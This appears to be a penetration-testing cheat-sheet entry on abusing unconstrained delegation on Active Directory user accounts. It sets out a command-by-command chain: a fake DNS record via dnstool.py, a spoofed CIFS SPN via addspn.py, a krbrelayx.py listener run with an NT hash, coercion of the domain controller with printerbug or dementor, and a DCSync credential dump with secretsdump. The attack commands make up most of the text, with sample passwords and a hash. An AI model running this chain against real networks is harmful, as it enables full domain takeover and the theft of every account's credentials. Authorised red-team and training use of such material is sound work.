# 09.15 Unconstrained Delegation Linux User Accounts via krbrelayx

> Spoof a CIFS SPN with `addspn.py`, inject DNS with `dnstool.py`, then listen with `krbrelayx.py` to decrypt coerced DC auth.

## Overview

When a user account (not a computer) has unconstrained delegation and an attacker holds GenericWrite over it, the attack uses Dirkjanm's krbrelayx suite. dnstool.py injects a fake DNS record pointing to the attacker's host; addspn.py adds a CIFS SPN to the compromised user account; krbrelayx.py listens and decrypts the incoming TGS+TGT using the compromised account's NT hash; printerbug.py or dementor.py coerces DC01 to authenticate.

## Steps

- Enumerate unconstrained-delegation user accounts with PowerView: Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)".
- Create a fake DNS record pointing to the attack host with dnstool.py.
- Add a CIFS SPN to the compromised user account with addspn.py.
- Start krbrelayx.py with the compromised account's NT hash to capture and decrypt incoming TGS+embedded TGT.
- Coerce DC authentication with printerbug.py or dementor.py.
- Export the saved ccache file to KRB5CCNAME, then run secretsdump.py -k -no-pass for DCSync.

## Commands

### PowerView find unconstrained-delegation users

```powershell
Import-Module .\PowerView.ps1
```

### dnstool add fake DNS record

```bash
python dnstool.py -u <DOMAIN>.LOCAL\\pixis -p p4ssw0rd -r roguecomputer.<DOMAIN>.LOCAL -d 10.10.14.2 --action add <TARGET>
```

### addspn add CIFS SPN to compromised account

```bash
python addspn.py -u <DOMAIN>.local\\pixis -p p4ssw0rd --target-type samname -t sqldev -s CIFS/roguecomputer.<DOMAIN>.local dc01.<DOMAIN>.local
```

### krbrelayx listen with account hash

```bash
sudo python krbrelayx.py -hashes :cf3a5525ee9414229e66279623ed5c58
```

### printerbug coerce DC authentication

```bash
python3 printerbug.py <DOMAIN>.local/carole.rose:[email protected] roguecomputer.<DOMAIN>.local
```

### dementor alternative coercion

```bash
python dementor.py -u pixis -p p4ssw0rd -d <DOMAIN>.local roguecomputer.<DOMAIN>.local dc01.<DOMAIN>.local
```

### secretsdump DCSync with captured TGT

```bash
export KRB5CCNAME=./DC01\$@<DOMAIN>.LOCAL@<DOMAIN>.LOCAL.ccache
```
